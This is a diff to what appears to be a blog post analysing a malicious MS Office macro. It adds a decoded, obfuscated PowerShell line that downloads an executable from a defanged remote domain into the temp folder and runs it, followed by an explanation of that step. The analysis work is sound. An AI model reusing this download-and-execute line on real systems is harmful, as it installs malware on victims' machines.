@@ -149,7 +149,14 @@ Let's try to decode this strings
 
 ![](/images/msofficemacros/image16.jpg)
 
+{% highlight ps1 %}
 
+$fdsfsdf = "fsfdghfddfgh";
+(NEw-objEct `N`e`T`.`W`e`B`C`l`i`e`N`T`).DownLoAdfIlE('hxxp[://]suyashcollegeofnursing[.]com/language/Don163/CryptedFile163[.]exe', "$ENv:temp\jfcbvept.exe");
+Start "$ENv:temp\jfcbvept.exe";
+\$fdsfsdf = "fsfdghfddfgh";
+
+{% endhighlight %}
 This powershell script is downloading a file from "hxxp[://]suyashcollegeofnursing[.]com" to **temp** directory with name "jfcbvept.exe" then it starts it
 
 CreateObject("Wscript.Shell") return is assigned to **zKShMevSa**
